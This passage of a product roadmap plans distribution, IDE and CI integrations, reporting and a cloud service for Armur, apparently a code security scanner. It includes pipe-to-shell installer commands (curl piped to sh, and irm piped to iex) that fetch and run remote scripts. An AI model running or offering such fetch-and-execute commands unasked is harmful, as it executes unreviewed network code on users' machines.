- [ ] `npx @armur/cli scan .` must work with zero prior setup — downloads binary, runs scan, exits
- [ ] Auto-detect and run without the Docker server when invoked via npx (always use `--in-process`)

#### 22.3 pip Package (Python Developer Channel)

- [ ] Create `packages/armur` pip package:
  - `pyproject.toml` with `scripts = { "armur" = "armur.cli:main" }`
  - `__init__.py` `main()`: detect OS/arch, download binary, exec it (similar to the npm approach)
- [ ] Publish to PyPI: `pip install armur` or `pipx install armur`
- [ ] `pipx install armur` is the recommended approach (isolated environment, global `armur` command)

#### 22.4 Windows (winget + Scoop + MSI)

- [ ] Submit to `winget-pkgs` (Windows Package Manager): `winget install Armur.Armur`
- [ ] Create Scoop manifest in `armur-ai/scoop-bucket`: `scoop install armur`
- [ ] Build `.msi` installer using `go-msi` for users who prefer GUI install
- [ ] Windows-specific: ensure all tool integrations work on Windows (use WSL for Linux-only tools)
- [ ] Test the complete CLI TUI experience on Windows Terminal

#### 22.5 Docker (Zero-Install Path for Any Platform)

- [ ] `docker run --rm -v $(pwd):/scan armur/scanner scan /scan` — scan cwd without any installation
- [ ] Publish to Docker Hub as `armur/scanner:latest` and `armur/scanner:v<version>`
- [ ] Docker image includes all 18 tools pre-installed (current behavior in the full image)
- [ ] Provide a convenience shell alias in the docs:
  ```bash
  alias armur='docker run --rm -v $(pwd):/scan armur/scanner'
  ```
- [ ] `armur/scanner:slim` — image with only the CLI tools (no server, no Redis) for local use

#### 22.6 `curl | sh` Universal Installer

- [ ] Host `install.armur.ai/install.sh` — detects OS/arch, downloads the correct binary, installs to `/usr/local/bin/`
  ```bash
  curl -fsSL https://install.armur.ai | sh
  ```
- [ ] The install script:
  1. Detects OS: `linux`, `darwin`, `windows`
  2. Detects arch: `amd64`, `arm64`
  3. Fetches latest release tag from GitHub API
  4. Downloads the binary and checksum file
  5. Verifies SHA256 checksum
  6. Installs to `/usr/local/bin/` (or `$HOME/.local/bin` if no root)
  7. Prints "armur installed! Run 'armur run' to get started."
- [ ] PowerShell equivalent for Windows: `irm install.armur.ai/install.ps1 | iex`
- [ ] All downloads are over HTTPS; checksums are verified before installation

#### 22.7 `armur update` Self-Update Command

- [ ] `armur update` — checks GitHub Releases API for a newer version and self-updates
- [ ] Atomically replaces the current binary (download to temp path, rename over existing)
- [ ] `armur update --check` — print latest version without updating
- [ ] Show update hint at the end of `armur run` output when a newer version is available (at most once per day)

#### 22.8 goreleaser Cross-Platform Release Pipeline

- [ ] `.goreleaser.yml` configuration:
  - Builds: `linux/amd64`, `linux/arm64`, `darwin/amd64`, `darwin/arm64`, `windows/amd64`
  - Archives: `.tar.gz` for Unix, `.zip` for Windows
  - Checksums: `SHA256SUMS` file signed with Cosign
  - Homebrew tap: auto-updates `armur-ai/homebrew-tap` formula on release
  - Docker: builds and pushes `armur/scanner` image on release
  - Changelog: generated from conventional commits
- [ ] Release workflow: `git tag v1.0.0 && git push --tags` → goreleaser does everything else
- [ ] Sign release binaries with Cosign for provenance attestation

#### 22.9 Public Download Metrics & Adoption Tracking

Every distribution channel must have **publicly visible download counts** — this creates social proof
and lets us measure product-market fit in real time.

- [ ] **npm**: Weekly download count visible at `npmjs.com/package/@armur/cli` — the primary public metric
  - Add `@armur/cli` download badge to README: `![npm downloads](https://img.shields.io/npm/dw/@armur/cli)`
  - Target: track weekly download growth as the north star adoption metric
- [ ] **PyPI**: Download count visible at `pypi.org/project/armur/`
  - Use `pypistats.org` for public charts: `pypistats.org/packages/armur`
  - Add PyPI badge to README: `![PyPI downloads](https://img.shields.io/pypi/dw/armur)`
- [ ] **Docker Hub**: Pull count visible at `hub.docker.com/r/armur/agent`
  - Add badge: `![Docker pulls](https://img.shields.io/docker/pulls/armur/agent)`
- [ ] **Homebrew**: Track via GitHub Releases download counts (goreleaser publishes assets)
  - Use `ghcr.io` download counts as additional signal
- [ ] **GitHub Releases**: Total download count per release visible on the Releases page
  - Add total download badge: `![GitHub Downloads](https://img.shields.io/github/downloads/armur-ai/armur/total)`
- [ ] **VS Code Marketplace**: Install count visible on the extension page
  - Add badge: `![VS Code installs](https://img.shields.io/visual-studio-marketplace/i/armur-ai.armur-security)`
- [ ] **Consolidated dashboard**: Create `armur.ai/stats` page showing all download counts in one view
  - Pull from: npm API, PyPI API, Docker Hub API, GitHub API, VS Code Marketplace API
  - Show weekly trend charts for each channel
  - Display total aggregate installs prominently
- [ ] Add all download badges to the main README in a single "Installs" badge row

---

### Sprint 23 — GitHub Native [DONE]: App, Actions & Security Tab

GitHub is where most open source and enterprise code lives. Deep GitHub integration is the
highest-leverage adoption channel for reaching developers who haven't discovered Armur yet.

#### 23.1 GitHub App (Zero-Config Org-Wide Scanning)

- [ ] Create `Armur Security` GitHub App at `github.com/apps/armur-security`
- [ ] App permissions:
  - Read: Contents, Pull Requests, Code scanning alerts, Checks
  - Write: Checks, Code scanning alerts, Pull Request review comments, Statuses
- [ ] Webhook events subscribed: `push`, `pull_request` (opened, synchronize, reopened), `installation`
- [ ] On `pull_request` event: automatically scan the PR's changed files (diff mode)
  - Enqueue a scan task with `--diff <base-sha>` and the PR's head commit
  - Report results via GitHub Checks API (creates a check run on the PR)
  - Upload SARIF to GitHub Code Scanning API (`/code-scanning/sarifs`)
  - Post inline review comments on the PR diff for each finding (one comment per finding, grouped by file)
- [ ] On `push` to default branch: scan full repo (background, non-blocking)
- [ ] Check run report format:
  ```
  Armur Security  ·  15 findings
  ──────────────────────────────
  ✗ Critical: 1   ✗ High: 4   ⚠ Medium: 7   · Low: 3
  View full report →
  ```
- [ ] PR comment summary (posted by the App bot):
  ```
  ## Armur Security Scan
  Found **15 findings** in the changed files.
  | Severity | Count |
  |----------|-------|
  | Critical | 1 |
  | High | 4 |
  | Medium | 7 |
  | Low | 3 |
  [View full results](https://github.com/owner/repo/security/code-scanning)
  ```
- [ ] Re-scan when a PR is updated (push to the PR branch)
- [ ] Respect `.armur.yml` from the repository for scan config
- [ ] App installation page: one-click install for an entire organization (covers all repos)

#### 23.2 GitHub Actions (Polished, Composable Action)

- [ ] Create `armur-ai/armur-action` GitHub Action (replaces the basic one from Sprint 3.2)
- [ ] Action inputs:
  ```yaml
  - uses: armur-ai/armur-action@v1
    with:
      path: '.'                    # directory to scan (default: repo root)
      depth: 'quick'               # quick | deep
      fail-on-severity: 'high'     # fail workflow if findings at this level or above
      min-severity: 'medium'       # suppress findings below this level in output
      output-format: 'sarif'       # sarif | json | table
      upload-sarif: true           # upload SARIF to GitHub Security tab
      comment-on-pr: true          # post findings summary as PR comment
      armur-version: 'latest'      # pin to a specific armur version
  ```
- [ ] Action outputs: `findings-count`, `critical-count`, `high-count`, `sarif-path`, `report-path`
- [ ] Automatically upload SARIF via `github/codeql-action/upload-sarif@v3`
- [ ] Auto-detect push vs PR and run appropriate mode (full scan vs diff scan)
- [ ] Publish to GitHub Actions Marketplace with verified badge
- [ ] Add badge to README: `[![Armur Scan](https://github.com/<owner>/<repo>/actions/workflows/armur.yml/badge.svg)](https://github.com/<owner>/<repo>/actions/workflows/armur.yml)`
- [ ] Include starter workflows for common patterns:
  - `armur-pr-scan.yml` — scan PRs and fail on HIGH findings
  - `armur-nightly.yml` — full deep scan nightly, notify via Slack
  - `armur-release-gate.yml` — block releases if CRITICAL findings exist

#### 23.3 GitHub Security Tab (Code Scanning Integration)

- [ ] SARIF output fully conformant with GitHub's Code Scanning SARIF requirements:
  - `$schema`: `https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json`
  - `runs[].tool.driver.name`: "Armur"
  - `runs[].tool.driver.rules[]`: one rule per unique finding type with `helpUri` linking to docs
  - `results[].locations[].physicalLocation.artifactLocation.uriBaseId`: `%SRCROOT%`
  - `results[].fingerprints`: for finding stability across scans (prevents duplicate alerts)
- [ ] Each SARIF rule includes a `help` markdown block with remediation guidance
- [ ] Finding level → SARIF level: Critical/High → `error`, Medium → `warning`, Low → `note`
- [ ] Findings show as inline annotations on the Files Changed tab in GitHub PRs

#### 23.4 GitHub Codespaces Integration

- [ ] Add Armur to the `devcontainer.json` feature registry:
  ```json
  "features": {
    "ghcr.io/armur-ai/features/armur:1": {}
  }
  ```
- [ ] The devcontainer feature installs the `armur` binary in the container
- [ ] Write `docs/integrations/codespaces.md`
- [ ] Provide a `.devcontainer/devcontainer.json` template that includes Armur + the VS Code extension
- [ ] When Armur is in the devcontainer, `armur run .` works with `--in-process` automatically (no Docker/Redis needed)

#### 23.5 GitHub Marketplace Listing

- [ ] Submit both the GitHub App and the GitHub Action to GitHub Marketplace
- [ ] Write compelling marketplace listing descriptions with screenshots
- [ ] Add demo video showing PR scan workflow (GIF embedded in marketplace listing)

---

### Sprint 24 — VS Code [DONE] / Cursor / AI Editor Ecosystem

Building on the LSP server and core VS Code extension functionality, this sprint focuses on
distribution, onboarding, and making the extension the #1 security extension on the marketplace.

#### 24.1 Language Server Protocol (LSP) Server

- [ ] Implement `armur lsp` command — start Armur as an LSP server
  - Protocol: JSON-RPC over stdio (standard LSP transport)
  - Capabilities: `textDocument/diagnostic`, `textDocument/codeAction`, `workspace/diagnostic`
- [ ] On `textDocument/didSave`: trigger an `--in-process` scan of the saved file; return diagnostics
- [ ] Diagnostics mapped to LSP `Diagnostic` objects: range, severity, code (rule ID), message, source ("armur")
- [ ] Code actions: `armur.fix` action — returns a `WorkspaceEdit` with the LLM-generated patch
- [ ] Debounce: wait 500ms after last keystroke before re-scanning
- [ ] Configure scan timeout in LSP mode (default: 30s) to avoid blocking the editor

#### 24.2 VS Code Extension — Polished Distribution

- [ ] Extension ID: `armur-ai.armur-security` — reserve this on the VS Code Marketplace
- [ ] Extension categories: `Linters`, `Other` — and tag: `security`, `scanner`, `SAST`, `DevSecOps`
- [ ] **Onboarding flow** (first install):
  - Welcome walkthrough: 3-screen carousel explaining what Armur does
  - Check if `armur` binary is installed; if not, offer one-click install (downloads binary)
  - Check server config; if no server: offer "Use local mode" (sets `--in-process`)
  - Run a 10-second quick scan of the open workspace on first activation
  - Show "Found X findings in your project" notification with "View All" button
- [ ] **Status bar item**: `$(shield) Armur: 3 high 12 med` — shows finding count, click to open panel
- [ ] **Explorer tree view**: "Armur Security" sidebar panel showing findings grouped by file
- [ ] **Problems panel integration**: all findings appear in VS Code's Problems panel with correct severity icons
- [ ] **Auto-scan on save**: configurable (default: off; opt-in in settings)
- [ ] **Scan on open**: run a background scan when a workspace is opened (configurable)
- [ ] Extension settings:
  ```json
  "armur.scanDepth": "quick",
  "armur.scanOnSave": false,
  "armur.scanOnOpen": true,
  "armur.minSeverity": "medium",
  "armur.binaryPath": "armur",
  "armur.serverUrl": "http://localhost:4500",
  "armur.useLocalMode": true
  ```
- [ ] `.vscode/extensions.json` recommendation: when a `.armur.yml` is present, VS Code prompts "Install Armur Security extension?"
- [ ] Show findings as inline squiggle diagnostics in the Problems panel
- [ ] CodeLens: show "2 security issues" above affected functions
- [ ] Hover tooltip: show finding summary when hovering over a highlighted line
- [ ] Quick Fix: "Fix with Armur AI" code action that calls `armur fix` and applies the patch
- [ ] Sidebar panel: filterable list of all findings in the workspace
- [ ] Command Palette: "Armur: Scan Workspace", "Armur: Clear Findings", "Armur: Explain Finding"
- [ ] Publish to VS Code Marketplace

#### 24.3 Cursor-Specific Integration

- [ ] The VS Code extension works in Cursor without modification (Cursor is VS Code-based)
- [ ] Add Cursor-specific MCP integration: when the extension detects it is running in Cursor, automatically set up the Armur MCP server config in Cursor's settings
- [ ] Write `docs/integrations/cursor.md` focused on the combined extension + MCP experience
- [ ] Cursor badge: "Works with Cursor" on the extension marketplace listing

#### 24.4 VS Code Web Extension (github.dev & Codespaces)

- [ ] Refactor the extension to support the VS Code Web Extension API (restricted environment)
- [ ] In web extension mode: use the Armur Cloud API instead of a local binary
- [ ] Show findings from the last scan (read-only) when no scan can be run
- [ ] Works in `github.dev`, Codespaces, and VS Code for the Web

#### 24.5 `.vscode/` Project Templates

- [ ] Provide `armur init --vscode` to scaffold `.vscode/` config:
  - `.vscode/extensions.json`: recommends `armur-ai.armur-security`
  - `.vscode/settings.json`: sets `armur.scanOnOpen: true`, `armur.minSeverity: "medium"`
  - `.vscode/tasks.json`: adds "Armur: Scan Workspace" as a task
- [ ] When a project has `.armur.yml` and no `.vscode/extensions.json`, offer to create one

#### 24.6 Neovim Plugin

- [ ] Create `armur-ai/armur.nvim` repository (Lua plugin for Neovim >= 0.9)
- [ ] Integrate with `nvim-lspconfig` as a custom LSP client pointing to `armur lsp`
- [ ] Show findings as LSP diagnostics (virtual text + signs)
- [ ] `:ArmurFix` command — apply AI fix for finding under cursor
- [ ] `:ArmurExplain` command — explain finding under cursor in a floating window
- [ ] Telescope picker: `:ArmurFindings` — fuzzy-search all findings

#### 24.7 JetBrains Plugin

- [ ] Create `armur-ai/armur-jetbrains` plugin (supports IntelliJ, GoLand, PyCharm, WebStorm)
- [ ] Run `armur` as an external tool; parse JSON output for findings
- [ ] Show findings as inspection warnings in the editor gutter
- [ ] Quick fix action: "Apply Armur AI Fix"
- [ ] Tool window panel: findings list with filter and sort
- [ ] Publish to JetBrains Marketplace

---

### Sprint 25 — CI/CD Ecosystem [DONE] Breadth

One GitHub Action is not enough. Every developer uses a different CI system. Armur needs a
first-class native integration in every major CI/CD platform.

#### 25.1 GitLab CI/CD

- [ ] Create `armur-ai/armur-gitlab-ci` repository with a GitLab CI include template:
  ```yaml
  # In your .gitlab-ci.yml:
  include:
    - project: 'armur-ai/armur-gitlab-ci'
      ref: 'v1'
      file: '/templates/armur-scan.yml'
  ```
- [ ] Template supports: MR scanning (diff mode), nightly full scans, SAST report artifact upload
- [ ] Map SARIF output to GitLab SAST JSON report format for the Security Dashboard
- [ ] Submit to GitLab's CI/CD catalog (official marketplace for CI templates)

#### 25.2 CircleCI Orb

- [ ] Create and publish `armur-ai/armur` CircleCI Orb to the Orb Registry
- [ ] Orb jobs: `armur/scan`, `armur/scan-and-report`
- [ ] Orb executors: `armur/default` (uses `armur/scanner` Docker image)
- [ ] Usage:
  ```yaml
  orbs:
    armur: armur-ai/armur@1.0.0
  jobs:
    security-scan:
      executor: armur/default
      steps:
        - armur/scan:
            fail-on-severity: high
  ```

#### 25.3 Jenkins Plugin

- [ ] Create `armur-jenkins-plugin` (Java, Maven-based Jenkins plugin)
- [ ] Post-build step: "Armur Security Scan" — runs scan, publishes findings as a build artifact
- [ ] Build status: fail build if findings exceed threshold (configurable)
- [ ] Finding trend graph in Jenkins job dashboard (using Jenkins Plot Plugin)
- [ ] Publish to Jenkins Plugin Index

#### 25.4 Azure DevOps Extension

- [ ] Create `armur-security` Azure DevOps extension in the Visual Studio Marketplace
- [ ] Pipeline task: `ArmurScan@1`
  ```yaml
  - task: ArmurScan@1
    inputs:
      scanPath: '$(Build.SourcesDirectory)'
      failOnSeverity: 'high'
      uploadSarif: true
  ```
- [ ] Uploads SARIF to Azure DevOps Code Scanning (if enabled in the project)
- [ ] Publish to Azure DevOps Marketplace

#### 25.5 Bitbucket Pipelines

- [ ] Create `armur-ai/armur-pipe` Bitbucket Pipe:
  ```yaml
  - pipe: armur-ai/armur-pipe:1.0.0
    variables:
      FAIL_ON_SEVERITY: 'high'
      MIN_SEVERITY: 'medium'
  ```
- [ ] Publish to Bitbucket Pipes catalog

#### 25.6 Additional CI Platforms

- [ ] **Drone CI** (`.drone.yml` plugin): `armur-ai/drone-armur` plugin image
- [ ] **Argo Workflows**: `WorkflowTemplate` YAML for running Armur as a workflow step
- [ ] **Tekton**: `Task` definition for running Armur in Tekton Pipelines
- [ ] **Dagger** module: `armur-ai/dagger-armur` — composable Armur scan in Dagger pipelines
- [ ] For each: provide a ready-to-use config snippet in `docs/ci/`

#### 25.7 Pre-commit Hook (Language-Agnostic)

- [ ] Create `.pre-commit-hooks.yaml` in the root repo:
  ```yaml
  - id: armur-scan
    name: Armur Security Scan
    language: system
    entry: armur scan --staged-only --fail-on-severity medium
    pass_filenames: false
    types: [text]
  ```
- [ ] For JS projects: `armur-ai/husky-armur` — Husky configuration for npm projects:
  ```json
  { "hooks": { "pre-commit": "armur scan --staged-only --fail-on-severity high" } }
  ```
- [ ] `armur setup pre-commit` — interactively configures the pre-commit hook for the current project (detects husky vs pre-commit framework vs plain git hooks)

---

### Sprint 26 — Developer Onboarding [DONE] & First-Run Experience

The first 5 minutes with Armur determine whether a developer uses it again. This sprint focuses
entirely on making those first 5 minutes remarkable.

#### 26.1 `armur quickstart` Interactive Onboarding

- [ ] `armur quickstart` — runs the first time `armur` is installed (also accessible anytime)
- [ ] Steps:
  1. "Welcome to Armur! Let's get you set up in 2 minutes."
  2. Run `armur doctor` inline — show which tools are installed
  3. Detect if the current directory is a git repo; offer to scan it immediately
  4. Run a 30-second quick scan with a beautiful live TUI progress display
  5. Show the summary card with findings
  6. Ask: "Set up automatic scanning on git push? (Y/n)"
  7. If yes: run `armur setup pre-commit` automatically
  8. "You're all set! Here's what to do next:" + 3 actionable next steps
- [ ] On first scan: open the interactive results browser so users see the TUI experience immediately
- [ ] After quickstart: create `~/.armur/profile.json` marking onboarding as complete (skip on subsequent runs)

#### 26.2 `armur tutorial` Interactive Learning Mode

- [ ] `armur tutorial` — walkthrough that teaches how to use Armur with a practice repo
- [ ] Downloads a sample vulnerable repo (`armur-ai/juice-shop-go` or similar)
- [ ] Guided steps:
  1. "Let's run a quick scan." → `armur run . --depth quick` with annotations
  2. "Here's a SQL injection. Let's understand it." → `armur explain <id>`
  3. "Let's fix it with AI." → `armur fix <id>`
  4. "Now let's check our dependencies." → `armur run . --sca-only`
  5. "Set up CI." → `armur setup github-actions`
- [ ] Each step waits for the user to complete the action (or press Enter to skip)
- [ ] Completion message: "You've completed the Armur tutorial!" + share result card

#### 26.3 MOTD & Contextual Tips

- [ ] After each scan, show one contextual tip related to the findings:
  - If secrets found: "Tip: Run `armur scan --history` to check your git history for leaked secrets"
  - If SCA findings: "Tip: Set up `armur setup pre-commit` to catch vulnerable deps before pushing"
  - If zero findings: "Clean scan! Add `armur scan --depth deep` to your nightly CI for thorough coverage"
- [ ] Tips shown at most once per day; dismissible; opt-out in settings

#### 26.4 `armur setup` Command Family

A unified setup wizard for every integration, so developers never have to read docs to connect things.

- [ ] `armur setup` — interactive menu listing all available integrations:
  ```
  armur setup
  ──────────────────────────────
  What would you like to set up?

  > Claude Code (MCP integration)
    VS Code extension
    GitHub Actions
    GitLab CI
    Pre-commit hook
    Slack notifications
    Jira integration
    Custom server
  ```
- [ ] `armur setup github-actions` — detects GitHub repo, generates `.github/workflows/armur.yml`, commits it
- [ ] `armur setup gitlab-ci` — adds include block to `.gitlab-ci.yml`
- [ ] `armur setup pre-commit` — adds Armur hook to `.pre-commit-config.yaml` or creates one
- [ ] `armur setup slack` — prompts for webhook URL, sends a test message, saves config
- [ ] `armur setup jira` — prompts for Jira URL + token, tests connection, saves config
- [ ] Each setup command ends with: "Set up complete. Test it with: <command>"

---

### Sprint 27 — Advanced Reporting [DONE] & Analytics

#### 27.1 Security Posture Score

- [ ] Compute a 0–100 security posture score for each scanned repo:
  ```
  score = 100
         - (critical_count × 20)
         - (high_count × 10)
         - (medium_count × 3)
         - (low_count × 0.5)
         + bonus_for_zero_critical × 10
  score = max(0, min(100, score))  // clamp to [0, 100]
  ```
- [ ] Add letter grade: A (90-100), B (75-89), C (60-74), D (40-59), F (<40)
- [ ] Display posture score prominently in the TUI summary card and HTML report header
- [ ] Track score over time in SQLite history: `posture_score` column in `scans` table
- [ ] `armur score <target>` quick command — print only the score + grade, no findings

#### 27.2 Finding Trend Charts (Terminal + HTML)

- [ ] **Terminal sparklines**: use `github.com/guptarohit/asciigraph` to render finding count over time
  - `armur trends --repo <path>` — show per-category trend over last 10 scans
  - `armur trends --severity high` — show HIGH finding count trend
- [ ] **HTML report charts**: inline SVG line charts of finding count over time (per severity)
- [ ] **Heatmap**: HTML report shows a file-level heatmap (which files have the most findings)

#### 27.3 Mean Time to Remediation (MTTR)

- [ ] When a finding from a previous scan is absent in the new scan → mark it as "resolved" in history
- [ ] Compute MTTR per category: average days between finding first detected and resolved
- [ ] `armur mttr --last 90d` — print MTTR table by category and severity
- [ ] Include MTTR in executive PDF report

#### 27.4 Developer Accountability Report

- [ ] Using git blame data: attribute each finding to the developer who introduced the code
- [ ] Per-developer summary: total open findings, critical count, MTTR
- [ ] `armur report team --task <id>` — generate per-developer breakdown
- [ ] This data is opt-in (`armur.yml: reporting.blame: true`) — off by default for privacy

#### 27.5 Risk Priority Score per Finding

- [ ] Compute a risk priority score for each finding beyond just severity:
  ```
  risk = base_cvss_score
       × reachability_multiplier  (1.5 if reachable, 1.0 if unknown, 0.5 if unreachable)
       × exposure_multiplier      (1.3 if internet-facing endpoint, 1.0 if internal)
       × fixability_factor        (1.0 if patch available, 0.8 if workaround only)
  ```
- [ ] Add `Finding.RiskScore float64` field
- [ ] Default sort in the TUI results browser: by `RiskScore` desc (not raw severity)
- [ ] `armur report risk --task <id>` — output findings sorted by risk score with score column

#### 27.6 Executive PDF Report

- [ ] `armur report pdf --task <id>` — generate a multi-page PDF executive report
- [ ] Report pages:
  1. Cover: target, date, posture score, grade
  2. Executive Summary: key metrics, highest-risk findings, trend vs previous scan
  3. Severity breakdown (pie chart)
  4. Compliance framework coverage (OWASP, PCI, HIPAA traffic-light matrix)
  5. Top 10 findings by risk score (detail for each)
  6. SCA: dependency vulnerability summary
  7. Secrets: secrets detected (redacted values)
  8. Remediation roadmap: prioritized action list
- [ ] Use `github.com/signintech/gopdf` or `maroto` library for PDF generation (no external dependencies)
- [ ] `armur report pdf --schedule weekly --email ciso@example.com` — scheduled PDF delivery


### Sprint 28 — Slack [DONE], Teams & Issue Tracker Integrations

When a critical vulnerability is found at 2am in a nightly scan, the right person needs to know
immediately — in the tool they use for communication, not in a dashboard they rarely visit.

#### 28.1 Slack Integration

- [ ] Create `Armur Security` Slack App at `api.slack.com/apps`
- [ ] **Incoming webhook notifications**: when a scan completes with findings above threshold, POST to a configured Slack webhook:
  ```
  🛡 Armur Security Alert
  ━━━━━━━━━━━━━━━━━━━━━
  Repo: github.com/acme/api
  Branch: main  ·  Scan: deep
  ━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔴 Critical  1   (new: 1)
  🟠 High      5   (new: 2)
  🟡 Medium    12
  ━━━━━━━━━━━━━━━━━━━━━━━━━
  [View findings]  [Assign]  [Suppress]
  ```
- [ ] Interactive buttons in Slack message: "View findings" → links to results, "Assign" → opens assignee picker in Slack, "Suppress" → mark as accepted risk
- [ ] `/armur scan <url>` Slack slash command: trigger a scan from Slack; bot replies with results in a thread
- [ ] `/armur status <task-id>` — check scan status from Slack
- [ ] Configurable notification thresholds: only notify for CRITICAL, or CRITICAL+HIGH, etc.
- [ ] Configuration: `armur config slack --webhook-url <url> --channel #security --notify-on critical`

#### 28.2 Microsoft Teams Integration

- [ ] Adaptive Card notification for Microsoft Teams (same trigger conditions as Slack)
- [ ] Teams Connector webhook: post scan results as a rich card
- [ ] Teams bot: `@Armur scan <url>` — trigger a scan from a Teams channel
- [ ] Configuration: `armur config teams --webhook-url <url>`

#### 28.3 Jira Integration

- [ ] When a scan finds HIGH or CRITICAL findings, auto-create Jira issues:
  - One Jira issue per finding (or one issue per scan with all findings as sub-tasks)
  - Issue type: "Security Bug"
  - Fields: Summary = finding message, Description = full finding detail + remediation, Priority = mapped from severity, Labels = ["security", "armur", tool-name]
  - Link to the affected file/line in the Jira description
- [ ] `armur config jira --url <jira-url> --project <key> --token <pat>` — configure Jira connection
- [ ] `armur jira sync --task <scan-id>` — manually sync findings to Jira
- [ ] Deduplication: don't create a Jira issue for a finding that already has an open issue (match by finding fingerprint)
- [ ] Auto-close Jira issues when findings are resolved in subsequent scans

#### 28.4 Linear Integration

- [ ] Auto-create Linear issues for findings (same logic as Jira):
  - Use Linear's GraphQL API
  - Map finding severity to Linear priority (Urgent/High/Medium/Low)
  - Add label "security" automatically
- [ ] `armur config linear --token <token> --team <team-id>` — configure Linear connection
- [ ] `armur linear sync --task <scan-id>` — sync findings to Linear

#### 28.5 GitHub Issues Auto-Creation

- [ ] `armur config github-issues --repo <owner/repo> --token <pat>` — configure GitHub Issues sink
- [ ] On scan completion: create one GitHub Issue per CRITICAL/HIGH finding:
  - Title: `[Armur] <severity>: <short-message> in <file>`
  - Label: `security`, `armur`, `<severity>`
  - Body: full finding detail, code snippet, remediation, link to PR if applicable
- [ ] `armur github sync --task <scan-id>` — manual sync

#### 28.6 PagerDuty Alerting

- [ ] Trigger PagerDuty incidents for CRITICAL findings in production repos
- [ ] `armur config pagerduty --service-key <key> --trigger-on critical` — configuration
- [ ] Include finding details in the PagerDuty incident description
- [ ] Auto-resolve PagerDuty incident when the finding is fixed in a subsequent scan

---

### Sprint 29 — Security Posture [DONE] Badges & Social Proof

Badges are a viral mechanism. Every GitHub README with an Armur badge is an ad for Armur.

#### 29.1 Dynamic Security Score Badge

- [ ] Host a badge service at `badge.armur.ai`:
  - `GET https://badge.armur.ai/<owner>/<repo>.svg` → SVG badge with current posture score
  - Badge styles: flat, flat-square, plastic (same as shields.io)
  - Colors: green (A/B), yellow (C), orange (D), red (F)
- [ ] Badge content: `armur | A · 94` (grade + score) or `armur | 0 critical` (zero critical variant)
- [ ] Badge is updated after every scan of the repo (GitHub App triggers the update)
- [ ] `armur badge generate` — prints the Markdown and HTML for embedding the badge in README
- [ ] Generate badges for the most common formats:
  ```markdown
  <!-- Standard -->
  [![Armur Security Score](https://badge.armur.ai/owner/repo.svg)](https://armur.ai/scan/owner/repo)
  <!-- Zero-critical variant -->
  [![Zero Critical Findings](https://badge.armur.ai/owner/repo/critical.svg)](https://armur.ai/scan/owner/repo)
  ```

#### 29.2 Public Scan Results Page

- [ ] Host `armur.ai/scan/<owner>/<repo>` — public findings summary page for open source repos
- [ ] Page shows: posture grade, severity breakdown, top 10 findings (by risk score), trend over last 30 scans
- [ ] Social sharing: "Share this scan" → Twitter/X, LinkedIn, Bluesky with pre-written message + badge
- [ ] "Verify" button: lets a repo maintainer claim the scan and add their own notes
- [ ] Embed widget: `<iframe src="https://armur.ai/embed/<owner>/<repo>">` — security summary card embeddable in project websites

#### 29.3 Armur Security Leaderboard

- [ ] Public leaderboard at `armur.ai/leaderboard` showing top-100 most secure open source repos
- [ ] Ranked by: posture score, zero-critical streak (consecutive scans with zero critical findings), MTTR
- [ ] Weekly "Most Improved" section: repos that improved their score the most in the last 7 days
- [ ] Opt-in for open source repos: scan with `armur run --public` to appear on the leaderboard
- [ ] Share your rank: "This repo is #47 in the Armur Security Leaderboard 🛡" — shareable card

#### 29.4 README Security Section Generator

- [ ] `armur readme generate` — generates a "Security" section for the project README:
  ```markdown
  ## Security

  This project uses [Armur](https://armur.ai) for automated security scanning.

  [![Armur Security Score](https://badge.armur.ai/owner/repo.svg)](https://armur.ai/scan/owner/repo)

  To run a security scan locally:
  \`\`\`bash
  armur run .
  \`\`\`

  Found a vulnerability? Please see our [security policy](SECURITY.md).
  ```
- [ ] `armur readme update` — automatically inserts or updates the Security section in the existing README

---

### Sprint 30 — Armur Cloud [DONE] (Hosted SaaS)

Some users will not want to run their own server. Armur Cloud removes all infrastructure friction
and adds team collaboration features that are impractical to self-host.

#### 30.1 Cloud Infrastructure

- [ ] Deploy the Armur server to a managed cloud environment (Fly.io or Railway for simplicity):
  - API server: horizontally scalable (stateless Gin server)
  - Workers: Asynq workers (scalable independently from API)
  - Redis: managed Redis instance
  - Storage: object storage (S3-compatible) for scan results and SBOMs
- [ ] Custom domain: `api.armur.ai`
- [ ] Status page: `status.armur.ai` (Uptime monitoring with public status)
- [ ] Multi-region: at minimum US and EU (for GDPR compliance)

#### 30.2 Web Dashboard

- [ ] Build `app.armur.ai` — the Armur Cloud web dashboard
- [ ] Pages:
  - **Dashboard**: recent scans, posture score trend, critical findings requiring attention
  - **Scans**: list of all scans with status, date, target, finding counts; trigger new scan
  - **Findings**: unified findings table across all repos with filter/sort/search
  - **Repositories**: list of connected repositories with their current posture score
  - **Reports**: generate and download reports for any past scan
  - **Settings**: API keys, team members, notification config, `.armur.yml` editor
- [ ] Built with: Next.js + Tailwind CSS (or equivalent — keep the stack simple)
- [ ] Real-time scan progress via WebSocket (same SSE events as the CLI TUI)
- [ ] Mobile-responsive design

#### 30.3 GitHub / GitLab OAuth Login

- [ ] GitHub OAuth: "Sign in with GitHub" — scopes: `user:email`, `read:org`, `repo` (for private repo scanning)
- [ ] GitLab OAuth: "Sign in with GitLab"
- [ ] On first login: show connected repositories (via GitHub API); offer one-click scan for any repo
- [ ] Auto-install the GitHub App when the user first connects a repository

#### 30.4 Cloud API

- [ ] Cloud API at `api.armur.ai` — same REST API as the self-hosted server, fully backward compatible
- [ ] API key per user (generated on signup)
- [ ] CLI works with Armur Cloud by setting: `armur config api-url https://api.armur.ai`
- [ ] `armur login` command: opens browser for OAuth, stores token, automatically sets API URL to cloud

#### 30.5 Pricing Tiers

- [ ] **Free tier**: 10 scans/month, public repos only, community tools only, results retained 7 days
- [ ] **Pro tier** ($0/month for open source, $15/month for private repos): unlimited scans, all tools, results retained 90 days, Slack/email notifications, 1 user
- [ ] **Team tier** ($49/month): everything in Pro + 5 users, RBAC, Jira/Linear integration, 1-year retention
- [ ] **Enterprise**: custom pricing, SSO, self-hosted option, SLA, dedicated support
- [ ] Open source projects: free Pro tier (verified via GitHub stars + license check)

---

### Sprint 31 — Community [DONE], Content & Growth Flywheel

Tools become category leaders not just from features, but from community, content, and
making contributors successful. This sprint builds the ecosystem around Armur.

#### 31.1 armur.ai Website

- [ ] Landing page at `armur.ai`:
  - Hero: animated terminal demo showing `armur run .` in action (asciinema embed or GIF)
  - "Scan any codebase in 30 seconds" headline
  - Language/IaC coverage grid (all supported tools + ecosystems with icons)
